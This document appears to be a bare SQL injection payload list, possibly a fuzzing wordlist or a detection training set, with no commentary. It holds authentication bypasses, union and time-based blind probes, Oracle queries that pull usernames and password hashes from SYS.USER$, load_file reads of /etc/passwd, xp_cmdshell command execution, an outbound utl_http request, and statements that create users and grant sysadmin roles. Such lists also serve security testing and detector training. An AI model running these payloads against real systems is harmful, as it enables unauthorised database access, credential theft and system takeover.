a' or 1 = 1; --
' and 1 = 0 )  union all
? or 1 = 1 --
x' and userid is NULL; --
x' and email is NULL; --
anything' or 'x' = 'x
x' and 1 =  ( select count ( * )  from tabname ) ; --
x' and members.email is NULL; --
x' or full_name like '%bob%
23 or 1 = 1; --
'; exec master..xp_cmdshell 'ping 172.10.1.255'--
1 or 1 = 1
1' or '1' = '1
1 and user_name (  )   =  'dbo'
1 exec sp_  ( or exec xp_ ) 
1 and 1 = 1
1' and 1 =  ( select count ( * )  from tablenames ) ; --
1 and user_name (  )   =  'dbo'
\'; desc users; --
1' and non_existant_table  =  '1
' or username is not NULL or username  =  '
"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116"
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --"
1 uni/**/on select all from where
’ or ‘1’ = ’1
' or '1' = '1
'||utl_http.request ( 'httP://192.168.1.1/' ) ||'
"' || myappadmin.adduser ( 'admin', 'newpass' )  || '"
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  "
 ( ||6 ) 
' or 1 = 1-- 
or 1 = 1
' or '1' = '1
; or '1' = '1'
""" or isNULL ( 1/0 )  /*"
' or '7659' = '7659
""" or isNULL ( 1/0 )  /*"
' or 1 = 1--
""" or 1 = 1--"
' or 1 = 1 /*
or 1 = 1--
' or 'a' = 'a
""" or ""a"" = ""a"
' )  or  ( 'a' = 'a
admin' or '
' select * from information_schema.tables--
 )  union select * from information_schema.tables;
' having 1 = 1--
' having 1 = 1--
' group by userid having 1 = 1--
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --
' or 1 in  ( select @@version ) --
' union all select @@version--
' or 'unusual'  =  'unusual'
' or 'something'  =  'some'+'thing'
' or 'text'  =  n'text'
' or 'something' like 'some%'
' or 2 > 1
' or 'text' > 't'
' or 'whatever' in  ( 'whatever' ) 
' or 2 between 1 and 3
' or username like char ( 37 ) ;
"' union select * from users where login  =  char ( 114,111,111,116 ) ;"
' union select 
password:*/ = 1--
uni/**/on sel/**/ect
'; execute immediate 'sel' || 'ect us' || 'er'
'; exec  ( 'sel' + 'ect us' + 'er' ) 
'/**/or/**/1/**/ = /**/1
' or 1/*
 or isNULL ( 1/0 )  /*
' or '7659' = '7659
""" or isNULL ( 1/0 )  /*"
' -- &password = 
'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > 
@var select @var as var into temp end --
' and 1 in  ( select var from temp ) --
"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;"
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;"
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;"
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
create user name identified by 'pass123'
create user name identified by pass123 temporary tablespace temp default tablespace users; 
' ; drop table temp --
"exec sp_addlogin 'name' , 'password'"
"exec sp_addsrvrolemember 'name' , 'sysadmin'"
"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  "
grant connect to name; grant resource to name;
"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) "
' or 1 = 1 --
' union  ( select @@version )  --
"' union  ( select NULL,  ( select @@version  )  )   --"
"' union  ( select NULL, NULL,  ( select @@version  )  )   --"
"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --"
"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --"
"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --"
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --"
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --"
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --"
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --"
'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --
'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- 
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --
" select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1"
" select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1"
 select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1
" select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1"
 select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1
" select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1"
 select * from users where id = 1 or \.<\ or 1 = 1 -- 1
 select * from users where id = 1 or \.<1 or 1 = 1 -- 1
" select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1"
" select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1"
 select * from users where id = 1 or \.<$ or 1 = 1 -- 1
" select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1"
" select * from users where id = 1 or \.<  = 1 union select 1,@@VERSION -- 1"
" select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1"
 select * from users where id = 1   or 1 = 1 -- 1
 select * from users where id = 1 or \+<\ or 1 = 1 -- 1
" select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1"
" select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1"
" select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1"
 select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1
" select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1"
 select * from users where id = 1 or $<\ or 1 = 1 -- 1
 select * from users where id = 1 or $<\. or 1 = 1 -- 1
" select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1"
" select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1"
 select * from users where id = 1 or $+<\ or 1 = 1 -- 1
" select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1"
" select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1"
" select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1"
 select * from users where id = 1 or \<\. or 1 = 1 -- 1
" select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1"
 select * from users where id = 1 or \<1 or 1 = 1 -- 1
" select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1"
" select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1"
" select * from users where id = 1 or \<\ union select null,@@VERSION -- 1"
 select * from users where id = 1 or \<$ or 1 = 1 -- 1
" select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1"
 select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1
" select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1"
 select * from users where id = 1 or !<@ or 1 = 1 -- 1
" select * from users where id = 1 or !<@ union select 1,version (  )  -- 1"
" select * from users where id = 1 or @`\` union select 1,version (  )  -- 1"
" select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1"
 select * from users where id = 1 + ( \ )  or 1 = 1 -- 1
" select * from users where id = 1 + ( \ )  union select null,@@VERSION -- 1"
" select * from users where id = 1.&&1 union select 1,version (  )  -- 1"
 select * from users where id = 1. or 1 = 1 -- 1
" select * from users where id = 1.&&@ union select 1,version (  )  -- 1"
 select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1
" select * from users where id = 1 +  ( \. )  union select null,@@VERSION -- 1"
" select * from users where id = 1.  union select 1,version (  )  -- 1"
" select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1.  union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1. union select null,version (  )  -- 1"
" select * from users where id = 1 +\. union select null,@@VERSION -- 1"
" select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1"
 select * from users where id = 1. <@ or 1 = 1 -- 1
 select * from users where id = 1.<@. or 1 = 1 -- 1
" select * from users where id = 1.<@. union select 1,version (  )  -- 1"
 select * from users where id = 1.*1 or 1 = 1 -- 1
" select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1.<1# union select 1,version (  )  -- 1"
" select * from users where id = 1. <@ union select 1,version (  )  -- 1"
" select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1.*\ union select null,@@VERSION -- 1"
 select * from users where id = 1.<@$ or 1 = 1 -- 1
" select * from users where id = 1.<@$ union select 1,version (  )  -- 1"
 select * from users where id = 1.%@ or 1 = 1 -- 1
" select * from users where id = 1.%@ union select 1,version (  )  -- 1"
" select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1"
 select * from users where id = 1 +1 or 1 = 1 -- 1
 select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1
" select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 11<1# union select 1,version (  )  -- 1"
 select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1
" select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1"
" select * from users where id = 1 +\+. union select null,@@VERSION -- 1"
" select * from users where id = 1 -1<@ union select 1,version (  )  -- 1"
" select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 +1<@ union select null,version (  )  -- 1"
 select * from users where id = 1 + \+%\ or 1 = 1 -- 1
 select * from users where id = 1 + \+%1 or 1 = 1 -- 1
" select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1"
" select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1"
 select * from users where id = 1 + \+%$ or 1 = 1 -- 1
" select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1"
" select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 union select 1||1,version (  )  -- 1"
" select * from users where id = 1 union select 1||@,version (  )  -- 1"
" select * from users where id = 1 union select 1 1$,version (  )  -- 1"
" select * from users where id = 1 union select 1 $,version (  )  -- 1"
" select * from users where id = 1 union select 1 1a,version (  )  -- 1"
" select * from users where id = 1 union select 1<@$,version (  )  -- 1"
" select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 union select .1_,version (  )  -- 1"
" select * from users where id = 1 union select 1`\`,version (  )  -- 1"
" select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 union select .1$_,version (  )  -- 1"
" select * from users where id = 1 union select 1<@,version (  )  -- 1"
" select * from users where id = 1 union select 1<@.,version (  )  -- 1"
" select * from users where id = 1 union select 1 $$,version (  )  -- 1"
" select * from users where id = 1 union select !<1,version (  )  -- 1"
" select * from users where id = 1 union select +!<1,version (  )  -- 1"
" select * from users where id = 1 union select +!<@,version (  )  -- 1"
" select * from users where id = 1 union select !<@,version (  )  -- 1"
" select * from users where id = 1 union select @||1,version (  )  -- 1"
" select * from users where id = 1 union select @&&@,version (  )  -- 1"
" select * from users where id = 1 union select @ 1$,version (  )  -- 1"
" select * from users where id = 1 union select  @ $,version (  )  -- 1"
" select * from users where id = 1 union select @ 1a,version (  )  -- 1"
" select * from users where id = 1 union select @<@$,version (  )  -- 1"
" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 union select @ _,version (  )  -- 1"
" select * from users where id = 1 union select @ $_,version (  )  -- 1"
" select * from users where id = 1 union select @<@,version (  )  -- 1"
" select * from users where id = 1 union select @<@.,version (  )  -- 1"
" select * from users where id = 1 union select @ $$,version (  )  -- 1"
 select * from users where id = 1 +$ . or 1 = 1 -- 1
" select * from users where id = 1 +$ . union select null,@@VERSION -- 1"
 select * from users where id = 1 +$ 1 or 1 = 1 -- 1
" select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1"
 select * from users where id = 1 +$+ or 1 = 1 -- 1
 select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1
" select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1"
 select * from users where id = 1 +$+. or 1 = 1 -- 1
" select * from users where id = 1 +$+. union select null,@@VERSION -- 1"
" select * from users where id = 1 +$+ union select null,@@VERSION -- 1"
 select * from users where id = 1 + $+%\ or 1 = 1 -- 1
 select * from users where id = 1 + $+%1 or 1 = 1 -- 1
" select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1"
" select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1"
 select * from users where id = 1 + $+%$ or 1 = 1 -- 1
" select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1"
 select * from users where id = 1 <@ or 1 = 1 -- 1
 select * from users where id = 1 % ( \ )  or 1 = 1 -- 1
" select * from users where id = 1 * ( \ )  union select null,@@VERSION -- 1"
 select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1
" select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1"
 select * from users where id = 1 % ( $ )  or 1 = 1 -- 1
 select * from users where id = 1 % ( @ )  or 1 = 1 -- 1
 select * from users where id = 1 <@. or 1 = 1 -- 1
 select * from users where id = 1 <@.. or 1 = 1 -- 1
" select * from users where id = 1<@.. union select 1,version (  )  -- 1"
" select * from users where id = 1 <@. union select 1,version (  )  -- 1"
" select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 *\. union select null,@@VERSION -- 1"
 select * from users where id = 1 <@.$ or 1 = 1 -- 1
" select * from users where id = 1 <@.$ union select 1,version (  )  -- 1"
 select * from users where id = 1 *1 or 1 = 1 -- 1
" select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1 <1## union select 1,version (  )  -- 1"
 select * from users where id = 1 <@1$ or 1 = 1 -- 1
" select * from users where id = 1 <@1$ union select 1,version (  )  -- 1"
" select * from users where id = 1 *\ union select null,@@VERSION -- 1"
 select * from users where id = 1 <@$ or 1 = 1 -- 1
 select * from users where id = 1 %$ . or 1 = 1 -- 1
" select * from users where id = 1 *$ . union select null,@@VERSION -- 1"
 select * from users where id = 1 %$ 1 or 1 = 1 -- 1
" select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1"
 select * from users where id = 1 <@$_ or 1 = 1 -- 1
" select * from users where id = 1 <@$_ union select 1,version (  )  -- 1"
 select * from users where id = 1 <@<@ or 1 = 1 -- 1
 select * from users where id = 1 %!<1 or 1 = 1 -- 1
" select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1"
" select * from users where id = 1<@<@ union select 1,version (  )  -- 1"
" select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 <@<@ union select null,version (  )  -- 1"
 select * from users where id = 1 %!<@ or 1 = 1 -- 1
" select * from users where id = 1 <@&@ union select 1,version (  )  -- 1"
" select * from users where id = 1 <@$$ union select 1,version (  )  -- 1"
 select * from users where id = 1 &@ or 1 = 1 -- 1
" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'"
" select * from users where id = '1' or  ( \ )  = 1 union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or  ( \. )  = 1 union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'"
 select * from users where id = '1' or \.<\ or 1 = 1 -- 1'
" select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or \.<  = 1 union select 1,@@VERSION -- 1'"
" select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'"
 select * from users where id = '1'   or 1 = 1 -- 1'
" select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'"
 select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1'
" select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'"
 select * from users where id = '1' or $<\ or 1 = 1 -- 1'
" select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'"
 select * from users where id = '1' or \<\. or 1 = 1 -- 1'
" select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'"
 select * from users where id = '1' or \<1 or 1 = 1 -- 1'
" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'"
" select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'"
 select * from users where id = '1' or \<$ or 1 = 1 -- 1'
